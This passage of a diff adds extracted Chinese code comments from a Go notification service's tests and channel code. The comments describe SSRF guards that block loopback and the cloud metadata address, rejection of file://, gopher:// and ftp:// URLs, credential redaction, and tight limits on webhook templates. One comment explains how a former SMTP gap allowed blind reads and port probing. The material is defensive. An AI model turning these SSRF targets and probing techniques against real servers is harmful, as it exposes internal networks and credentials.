+    "path": "source/notify/render_test.go",
+    "Start": 2682,
+    "End": 2718,
+    "Line": 81,
+    "Text": "// 截断后仍须可读且合法。"
+  },
+  {
+    "path": "source/notify/render_test.go",
+    "Start": 2936,
+    "End": 3027,
+    "Line": 89,
+    "Text": "// 直接截断 HTML 会切出 `<a href=\"htt` 这种残片，平台会拒收整条消息。"
+  },
+  {
+    "path": "source/notify/render_test.go",
+    "Start": 3338,
+    "End": 3420,
+    "Line": 96,
+    "Text": "// 尾部不能有未闭合的 `<`（即最后一段里出现 `<` 却无 `>`）。"
+  },
+  {
+    "path": "source/notify/render_test.go",
+    "Start": 3840,
+    "End": 3933,
+    "Line": 110,
+    "Text": "// 超出上限时必须标注总数，否则读者不知道还有多少资产没列出来。"
+  },
+  {
+    "path": "source/notify/render_test.go",
+    "Start": 4393,
+    "End": 4441,
+    "Line": 127,
+    "Text": "// 未知状态原样回显，不臆造标签。"
+  },
+  {
+    "path": "source/notify/render_test.go",
+    "Start": 4571,
+    "End": 4663,
+    "Line": 133,
+    "Text": "// TestTruncateHTMLNeverCutsEntity 覆盖审计指出的一处遗漏：截断不只要避开"
+  },
+  {
+    "path": "source/notify/render_test.go",
+    "Start": 4664,
+    "End": 4721,
+    "Line": 134,
+    "Text": "// 半截标签，还要避开被切断的 HTML 实体。"
+  },
+  {
+    "path": "source/notify/render_test.go",
+    "Start": 4725,
+    "End": 4826,
+    "Line": 136,
+    "Text": "// `&amp;` 被切成 `&amp` 之后，一个只认实体的解析器可能拒收**整条**消息——"
+  },
+  {
+    "path": "source/notify/render_test.go",
+    "Start": 4827,
+    "End": 4884,
+    "Line": 137,
+    "Text": "// 而超长汇总消息本来就常见，代价太大。"
+  },
+  {
+    "path": "source/notify/render_test.go",
+    "Start": 5069,
+    "End": 5137,
+    "Line": 142,
+    "Text": "// 尾部不得出现「有 & 但没有对应 ;」的实体残片。"
+  },
+  {
+    "path": "source/notify/sign_test.go",
+    "Start": 58,
+    "End": 148,
+    "Line": 9,
+    "Text": "// 签名基准值由 OpenSSL 独立算出，不是用本包自己的实现生成的——"
+  },
+  {
+    "path": "source/notify/sign_test.go",
+    "Start": 149,
+    "End": 221,
+    "Line": 10,
+    "Text": "// 否则只能证明「代码没变」，证明不了「算法对」。"
+  },
+  {
+    "path": "source/notify/sign_test.go",
+    "Start": 264,
+    "End": 373,
+    "Line": 13,
+    "Text": "//\t钉钉: printf '%s\\n%s' \"$TS\" \"$SECRET\" | openssl dgst -sha256 -hmac \"$SECRET\" -binary | openssl base64 -A"
+  },
+  {
+    "path": "source/notify/sign_test.go",
+    "Start": 431,
+    "End": 545,
+    "Line": 15,
+    "Text": "//\t飞书: printf '' | openssl dgst -sha256 -hmac \"$(printf '%s\\n%s' \"$TS\" \"$SECRET\")\" -binary | openssl base64 -A"
+  },
+  {
+    "path": "source/notify/sign_test.go",
+    "Start": 1436,
+    "End": 1503,
+    "Line": 40,
+    "Text": "// 原有 query 参数（access_token）不能被签名覆盖掉。"
+  },
+  {
+    "path": "source/notify/sign_test.go",
+    "Start": 1830,
+    "End": 1927,
+    "Line": 53,
+    "Text": "// TestSignAlgorithmsDiffer 锁住两家的算法差异。它们刚好互为对方的参数顺序"
+  },
+  {
+    "path": "source/notify/sign_test.go",
+    "Start": 1928,
+    "End": 2016,
+    "Line": 54,
+    "Text": "// （钉钉 key=secret，飞书 key=待签串），照另一家抄必然校验失败，"
+  },
+  {
+    "path": "source/notify/sign_test.go",
+    "Start": 2017,
+    "End": 2092,
+    "Line": 55,
+    "Text": "// 这条用例确保将来重构不会把两者合并成同一个函数。"
+  },
+  {
+    "path": "source/notify/sign_test.go",
+    "Start": 2552,
+    "End": 2628,
+    "Line": 69,
+    "Text": "// 未开启加签的机器人：不得凭空添加 timestamp/sign 参数。"
+  },
+  {
+    "path": "source/notify/sign_test.go",
+    "Start": 3138,
+    "End": 3224,
+    "Line": 87,
+    "Text": "// file:// 之类不应放行——http.Client 对它们的处理超出预期范围。"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 124,
+    "End": 166,
+    "Line": 15,
+    "Text": "// 本文件覆盖两条相关的加固："
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 167,
+    "End": 249,
+    "Line": 16,
+    "Text": "//   ① 投递地址不得把服务端当跳板打内网 / 云元数据（SSRF）"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 250,
+    "End": 316,
+    "Line": 17,
+    "Text": "//   ② 地址校验的错误信息不得带出地址里的凭据"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 320,
+    "End": 428,
+    "Line": 19,
+    "Text": "// 关于测试环境：本包大量用例用 127.0.0.1 上的 httptest 假接收端，守卫默认会拦下"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 429,
+    "End": 526,
+    "Line": 20,
+    "Text": "// 它们。所以 TestMain 里统一打开 AllowLocalTargetsEnv，而下面每个 SSRF 用例都"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 527,
+    "End": 588,
+    "Line": 21,
+    "Text": "// 显式把它清掉，以断言**默认拒绝**的行为。"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 621,
+    "End": 704,
+    "Line": 24,
+    "Text": "// 让常规用例能连本地的假接收端；SSRF 用例会自己临时清空。"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 768,
+    "End": 842,
+    "Line": 29,
+    "Text": "// TestDialGuardRejectsLoopbackByDefault 是 SSRF 防护的核心断言："
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 843,
+    "End": 916,
+    "Line": 30,
+    "Text": "// 默认配置下，投递到环回地址必须被**连接层**拒绝。"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 1199,
+    "End": 1232,
+    "Line": 39,
+    "Text": "// 关掉逃生口 = 默认行为"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 1544,
+    "End": 1631,
+    "Line": 48,
+    "Text": "// 错误信息要能指导用户怎么放开（本机 SMTP 中继是合法配置）。"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 1760,
+    "End": 1847,
+    "Line": 54,
+    "Text": "// TestDialGuardAllowsLoopbackWhenOptedIn 反向用例：显式打开后必须能用，"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 1848,
+    "End": 1928,
+    "Line": 55,
+    "Text": "// 否则本机 postfix / 内网中继这类合法部署会被一刀切废掉。"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 2549,
+    "End": 2606,
+    "Line": 72,
+    "Text": "// 云元数据端点——本函数存在的主要理由"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 2702,
+    "End": 2765,
+    "Line": 76,
+    "Text": "// IPv4-mapped 形式必须还原后再判，否则是绕过口"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 2886,
+    "End": 2983,
+    "Line": 84,
+    "Text": "// RFC1918 私网**刻意放行**：内网自建 Mattermost / SMTP 中继是常见合法用法。"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 2985,
+    "End": 3093,
+    "Line": 85,
+    "Text": "// 这条断言把这个取舍固定下来——若将来有人顺手加上私网判断，这里会失败，"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 3095,
+    "End": 3176,
+    "Line": 86,
+    "Text": "// 从而逼出一次有意识的决定（而不是静默废掉一批部署）。"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 3424,
+    "End": 3511,
+    "Line": 95,
+    "Text": "// TestValidateHTTPURLRejectsLiteralPrivateTargets 覆盖配置阶段的前置提示："
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 3512,
+    "End": 3588,
+    "Line": 96,
+    "Text": "// 字面 IP 在保存时就该被拒，而不是等第一次投递失败。"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 3942,
+    "End": 4032,
+    "Line": 108,
+    "Text": "// 公网地址与私网地址照常通过（私网留给拨号阶段，那里不拦）。"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 4234,
+    "End": 4328,
+    "Line": 116,
+    "Text": "// TestValidateHTTPURLErrorNeverLeaksCredentials 是审计指出我上一轮遗漏的分支。"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 4332,
+    "End": 4432,
+    "Line": 118,
+    "Text": "// url.Parse **失败**时会返回 *url.Error，其 Error() 含完整原始地址。上一轮我只"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 4433,
+    "End": 4539,
+    "Line": 119,
+    "Text": "// 脱敏了 http.Client.Do 的返回错误，漏了这里；而当时补的「永久失败路径」用例"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 4540,
+    "End": 4644,
+    "Line": 120,
+    "Text": "// （file://、gopher://、ftp://）其实都能被 url.Parse 解析成功、走的是 scheme 分支，"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 4645,
+    "End": 4714,
+    "Line": 121,
+    "Text": "// 所以全绿也证明不了这条路径安全——是假保证。"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 4867,
+    "End": 4891,
+    "Line": 124,
+    "Text": "// 非法百分号转义"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 4957,
+    "End": 4975,
+    "Line": 125,
+    "Text": "// 端口非数字"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 5041,
+    "End": 5059,
+    "Line": 126,
+    "Text": "// 括号不配对"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 5094,
+    "End": 5190,
+    "Line": 129,
+    "Text": "// 先确认这个输入**确实**让 url.Parse 失败。不做这一步的话，用例可能在"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 5193,
+    "End": 5286,
+    "Line": 130,
+    "Text": "// 毫无察觉的情况下走到别的分支（上一轮的假保证就是这么来的）。"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 5593,
+    "End": 5650,
+    "Line": 142,
+    "Text": "// 确认渠道层的包装也没有把地址带出去。"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 5873,
+    "End": 5955,
+    "Line": 151,
+    "Text": "// TestEmailDialGuardRejectsLoopbackByDefault 覆盖 SMTP 渠道的拨号守卫。"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 5959,
+    "End": 6059,
+    "Line": 153,
+    "Text": "// 邮件渠道曾经用的是裸 net.Dialer，是整套 SSRF 防护里唯一的缺口：host 填成"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 6060,
+    "End": 6151,
+    "Line": 154,
+    "Text": "// 169.254.169.254 或 127.0.0.1 能直接连上，而 smtp.NewClient 握手失败时会把"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 6152,
+    "End": 6260,
+    "Line": 155,
+    "Text": "// 对端返回的那一行包进错误、经 last_error 由投递历史接口回显——正是其它渠道"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 6261,
+    "End": 6367,
+    "Line": 156,
+    "Text": "// 已经关掉的半盲读原语；「连接被拒 vs 超时」的耗时差异还能用来探测端口。"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 6371,
+    "End": 6464,
+    "Line": 158,
+    "Text": "// 本包的 TestMain 全局打开了 AllowLocalTargetsEnv（大量用例用 127.0.0.1 上的"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 6465,
+    "End": 6570,
+    "Line": 159,
+    "Text": "// 假接收端），所以这个用例必须自己把它清掉——否则守卫在不在都会通过，"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 6571,
+    "End": 6634,
+    "Line": 160,
+    "Text": "// 这也正是缺口当初没被任何测试发现的原因。"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 6785,
+    "End": 6818,
+    "Line": 165,
+    "Text": "// 关掉逃生口 = 默认行为"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 6975,
+    "End": 7067,
+    "Line": 170,
+    "Text": "// 连接根本不该建立：守卫在 Control 钩子里拦下，EHLO 永远发不出去。"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 7181,
+    "End": 7271,
+    "Line": 174,
+    "Text": "// 错误信息要能指导用户怎么放开（本机 postfix 中继是合法配置）。"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 7400,
+    "End": 7489,
+    "Line": 180,
+    "Text": "// TestEmailDialGuardAllowsLoopbackWhenOptedIn 是配对的反向用例：显式打开后"
+  },
+  {
+    "path": "source/notify/ssrf_test.go",
+    "Start": 7490,
+    "End": 7600,
+    "Line": 181,
+    "Text": "// 必须能正常投递。内网自建 SMTP / 本机中继是非常常见的部署，守卫不能一刀切。"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 95,
+    "End": 180,
+    "Line": 12,
+    "Text": "// telegramTextLimit 是 Telegram sendMessage 的 text 字段上限（字符数）。"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 213,
+    "End": 258,
+    "Line": 15,
+    "Text": "// telegramChannel 实现 Telegram Bot API。"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 262,
+    "End": 280,
+    "Line": 17,
+    "Text": "// 平台特性："
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 281,
+    "End": 363,
+    "Line": 18,
+    "Text": "//   - 鉴权全部在 URL path 里（/bot<token>/sendMessage），无需加签。"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 364,
+    "End": 459,
+    "Line": 19,
+    "Text": "//   - 用 HTML 解析模式而不是 MarkdownV2：MarkdownV2 要求转义 `_*[]()~`>#+-=|{}.!`"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 460,
+    "End": 552,
+    "Line": 20,
+    "Text": "//     共 18 个字符，漏一个就整条消息被拒；HTML 只需转义 & < > 三个。"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 553,
+    "End": 622,
+    "Line": 21,
+    "Text": "//   - 业务错误同样藏在 HTTP 200 里，靠 ok 字段判断。"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 716,
+    "End": 788,
+    "Line": 26,
+    "Text": "// Telegram 单聊约 1 条/秒、群组 20 条/分钟。取保守值。"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 851,
+    "End": 969,
+    "Line": 29,
+    "Text": "// Bot Token 是完整凭据；chat_id 只是收件人，不算秘密（拿到它没有 Token 也发不了消息）。"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 1049,
+    "End": 1157,
+    "Line": 32,
+    "Text": "// base_url 决定 Token 被发往哪个 API 端点（如自建反代），改它必须重新表态 Token。"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 2530,
+    "End": 2630,
+    "Line": 80,
+    "Text": "// 429 是限流，退避后重试有效；其余（400 参数错、401 token 错、403 被拉黑、"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 2632,
+    "End": 2698,
+    "Line": 81,
+    "Text": "// 404 chat 不存在）都是配置问题，重试不会自愈。"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 2898,
+    "End": 2980,
+    "Line": 88,
+    "Text": "// telegramEndpoint 拼出 sendMessage 地址。base_url 留空时用官方 API，"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 2981,
+    "End": 3059,
+    "Line": 89,
+    "Text": "// 非空时用于自建 Bot API 反代（国内网络下的常见需求）。"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 3380,
+    "End": 3460,
+    "Line": 100,
+    "Text": "// 不透传 err：地址里含 Bot Token，且此时连 addr 都不该回显。"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 3587,
+    "End": 3688,
+    "Line": 106,
+    "Text": "// telegramHTML 渲染 HTML 正文，返回正文与实际写入的条目数（见 Channel.Send）。"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 3841,
+    "End": 3928,
+    "Line": 111,
+    "Text": "// Telegram 的上限是**字符数**，所以打包也按字符计量（runeSize）。"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 5359,
+    "End": 5456,
+    "Line": 151,
+    "Text": "// telegramReservedRunes 预留给消息标题与可能出现的截断提示（按字符计）。"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 5492,
+    "End": 5582,
+    "Line": 154,
+    "Text": "// telegramBatchLine 渲染汇总里的一条（未转义，由调用方统一转义）。"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 5869,
+    "End": 5973,
+    "Line": 162,
+    "Text": "// telegramBatchTitle 渲染汇总消息的标题行。条数用的是**本条实际包含**的条数，"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 5974,
+    "End": 6061,
+    "Line": 163,
+    "Text": "// 而不是本批总数——否则读者会以为消息头写的数字就是全部。"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 6474,
+    "End": 6519,
+    "Line": 175,
+    "Text": "// telegramEscape 转义 HTML 文本内容。"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 6520,
+    "End": 6626,
+    "Line": 176,
+    "Text": "// Telegram 只认这三种实体，转义后 &amp; 之类的已有实体会被二次转义——这正是"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 6627,
+    "End": 6710,
+    "Line": 177,
+    "Text": "// 期望行为：我们要显示的是原始字符，不是让用户注入 HTML。"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 6884,
+    "End": 6975,
+    "Line": 185,
+    "Text": "// telegramEscapeAttr 转义 HTML 属性值。在文本转义之外还要处理引号——"
+  },
+  {
+    "path": "source/notify/telegram.go",
+    "Start": 6976,
+    "End": 7061,
+    "Line": 186,
+    "Text": "// URL 里带引号会提前闭合 href 属性，把后面的内容变成注入点。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 130,
+    "End": 233,
+    "Line": 15,
+    "Text": "// webhookChannel 是通用 Webhook 适配器：用户自定 URL、方法、请求头与 JSON 模板。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 234,
+    "End": 338,
+    "Line": 16,
+    "Text": "// 它的存在让本功能不必为 Slack / Mattermost / Discord / 自建系统各写一个实现——"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 339,
+    "End": 390,
+    "Line": 17,
+    "Text": "// 那些平台都能被一个可配模板覆盖。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 481,
+    "End": 589,
+    "Line": 22,
+    "Text": "// 通用 Webhook 没有官方限制，返回 0 表示默认不限流，由使用者按对端能力自定。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 650,
+    "End": 753,
+    "Line": 25,
+    "Text": "// 掩码 url 与 headers：目标地址本身常带 token，自定义头里通常放着鉴权凭据，"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 754,
+    "End": 814,
+    "Line": 26,
+    "Text": "// 两者都会出现在接口回显里，所以都要挡。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 815,
+    "End": 944,
+    "Line": 27,
+    "Text": "// 代价是编辑时若想改动其中一个头，需要重新填整组头（掩码值会被解释为「保持原值」）——"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 945,
+    "End": 1032,
+    "Line": 28,
+    "Text": "// 这个取舍是刻意的：宁可多填一次，也不把凭据回显到浏览器。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 1116,
+    "End": 1213,
+    "Line": 31,
+    "Text": "// 目的地是 url。改 url 时必须重新表态 headers —— 否则原始 Authorization 头"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 1214,
+    "End": 1283,
+    "Line": 32,
+    "Text": "// 会被原样发到新地址，这正是掩码绕过的主路径。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 1361,
+    "End": 1456,
+    "Line": 35,
+    "Text": "// webhookDefaultTemplate 是未填模板时的兜底请求体：一个直白的 JSON 结构，"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 1457,
+    "End": 1526,
+    "Line": 36,
+    "Text": "// 覆盖绝大多数「收一条 JSON 入库」的自建接收端。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 2003,
+    "End": 2065,
+    "Line": 57,
+    "Text": "// webhookTemplateData 是暴露给用户模板的上下文。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 2183,
+    "End": 2251,
+    "Line": 64,
+    "Text": "// SentAt 是本次投递时间（RFC3339），供接收端记录。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 2518,
+    "End": 2628,
+    "Line": 79,
+    "Text": "// StatusLabel 是状态变更的可读描述，如「待处理 → 已修复」；非状态变更时为空。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 3617,
+    "End": 3717,
+    "Line": 111,
+    "Text": "// GET 不带请求体：把内容塞进 query 超出模板能力范围，也不符合 GET 语义，"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 3719,
+    "End": 3787,
+    "Line": 112,
+    "Text": "// 所以 GET 只适合「命中即触发钩子」这类接收端。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 3957,
+    "End": 4051,
+    "Line": 119,
+    "Text": "// 模板渲染出的是字符串形式的 JSON，这里转成 json.RawMessage 原样发出，"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 4054,
+    "End": 4138,
+    "Line": 120,
+    "Text": "// 避免二次转义把用户精心构造的结构套进一个 JSON 字符串里。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 4391,
+    "End": 4469,
+    "Line": 129,
+    "Text": "// 允许覆盖，但放在 headers 之后应用，保证显式配置优先。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 4672,
+    "End": 4780,
+    "Line": 138,
+    "Text": "// 通用 Webhook 不截断正文（接收端是用户自己的服务，体积由 body_template 决定），"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 4782,
+    "End": 4812,
+    "Line": 139,
+    "Text": "// 因此整批都算送达。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 4842,
+    "End": 4917,
+    "Line": 143,
+    "Text": "// renderWebhookBody 用用户模板（或默认模板）渲染请求体。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 5376,
+    "End": 5415,
+    "Line": 159,
+    "Text": "// parseWebhookTemplate 解析模板。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 5419,
+    "End": 5533,
+    "Line": 161,
+    "Text": "// missingkey=zero 让缺失的 map 键渲染成零值而不是报错——但本文件的上下文是结构体，"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 5534,
+    "End": 5630,
+    "Line": 162,
+    "Text": "// 主要作用是让 .Items 为空时 range 不出错。真正需要防的是 .Items 为 nil。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 5796,
+    "End": 5856,
+    "Line": 167,
+    "Text": "// webhookTemplateFuncs 是暴露给模板的辅助函数。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 5903,
+    "End": 5943,
+    "Line": 169,
+    "Text": "// json 把任意值序列化成 JSON。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 5949,
+    "End": 6054,
+    "Line": 171,
+    "Text": "// 这个函数不是锦上添花而是必需的：省去它，用户只能写 {{.Title}} 直接插值，"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 6056,
+    "End": 6160,
+    "Line": 172,
+    "Text": "// 而漏洞标题里只要有引号或换行，整段请求体就不再是合法 JSON——接收端会"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 6162,
+    "End": 6266,
+    "Line": 173,
+    "Text": "// 拒收，且报错信息指向「JSON 解析失败」，完全联想不到是标题里有个引号。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 6407,
+    "End": 6509,
+    "Line": 181,
+    "Text": "// jsons 用于把 JSON 片段嵌进另一段 JSON 字符串值内部（做一层字符串转义）。"
+  },
+  {
+    "path": "source/notify/webhook.go",
+    "Start": 6705,
+    "End": 6771,
+    "Line": 191,
+    "Text": "// 去掉外层引号：调用方自己决定要不要加引号。"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 80,
+    "End": 141,
+    "Line": 11,
+    "Text": "// 本文件锁住通用 Webhook 模板的**能力边界**。"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 145,
+    "End": 262,
+    "Line": 13,
+    "Text": "// 这是全包唯一「用户提供的字符串会被当代码求值」的地方，所以要明确它能做什么、"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 263,
+    "End": 377,
+    "Line": 14,
+    "Text": "// 不能做什么，并用测试把这些性质固定下来——否则将来有人顺手给模板上下文加个"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 378,
+    "End": 474,
+    "Line": 15,
+    "Text": "// 方法、或在 FuncMap 里加个 readFile，能力面就静默扩大了，而 diff 看起来"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 475,
+    "End": 511,
+    "Line": 16,
+    "Text": "// 只是一个无害的小函数。"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 513,
+    "End": 572,
+    "Line": 18,
+    "Text": "// TestTemplateContextHasNoMethods 是最重要的一条。"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 576,
+    "End": 683,
+    "Line": 20,
+    "Text": "// text/template 会调用导出方法（{{.Foo}} 既能取字段也能调方法）。所以模板上下文"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 684,
+    "End": 793,
+    "Line": 21,
+    "Text": "// 只要能接触到**任何**带导出方法的类型，就等于把那些方法暴露给了模板作者。"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 794,
+    "End": 878,
+    "Line": 22,
+    "Text": "// 本功能的上下文刻意全是纯数据（只有导出字段、零方法）。"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 882,
+    "End": 968,
+    "Line": 24,
+    "Text": "// 若这条失败：说明有人给 webhookTemplateData / webhookItem 加了方法。"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 969,
+    "End": 1077,
+    "Line": 25,
+    "Text": "// 在决定放行之前，先想清楚那个方法能不能被模板用来读取不希望暴露的东西。"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 1561,
+    "End": 1631,
+    "Line": 40,
+    "Text": "// TestTemplateFuncsAreMinimal 锁住暴露给模板的函数集合。"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 1635,
+    "End": 1740,
+    "Line": 42,
+    "Text": "// FuncMap 里每多一个函数就多一项能力。当前只有 json / jsons，作用是把值序列化"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 1741,
+    "End": 1822,
+    "Line": 43,
+    "Text": "// 成 JSON 片段——不能读文件、不能发请求、不能执行命令。"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 2261,
+    "End": 2332,
+    "Line": 57,
+    "Text": "// TestTemplateCannotReachUnknownData 覆盖模板里的越界访问："
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 2333,
+    "End": 2444,
+    "Line": 58,
+    "Text": "// 访问不存在的东西必须失败，而不是回显点什么；且失败信息不得带出内部数据。"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 2653,
+    "End": 2738,
+    "Line": 64,
+    "Text": "// 错误里不能出现模板上下文里的真实内容（漏洞标题/摘要）。"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 2918,
+    "End": 3010,
+    "Line": 72,
+    "Text": "// TestTemplateRenderFailsPermanently 模板写错属于配置错误，重试不会自愈。"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 3011,
+    "End": 3095,
+    "Line": 73,
+    "Text": "// 若被判成可重试，一条坏模板会让每次投递都白跑三轮退避。"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 3379,
+    "End": 3463,
+    "Line": 82,
+    "Text": "// 即便绕过校验直接投递，也必须判永久失败而不是反复重试。"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 3642,
+    "End": 3741,
+    "Line": 89,
+    "Text": "// TestTemplateCanOnlyProduceJSON 覆盖「模板渲染结果必须是合法 JSON」这条约束。"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 3742,
+    "End": 3829,
+    "Line": 90,
+    "Text": "// 它顺带挡住了「用模板生成纯文本去触发别的协议」这类用法。"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 3883,
+    "End": 3907,
+    "Line": 92,
+    "Text": "// 合法模板能过。"
+  },
+  {
+    "path": "source/notify/webhook_template_test.go",
+    "Start": 4119,
+    "End": 4188,
+    "Line": 97,
+    "Text": "// 渲染出非 JSON 时必须拒绝（而不是原样发出去）。"
+  },
+  {
+    "path": "source/notify/wecom.go",
+    "Start": 73,
+    "End": 173,
+    "Line": 10,
+    "Text": "// weComMarkdownLimit 是企微群机器人 markdown content 的硬上限（字节，非字符）。"
+  },
+  {
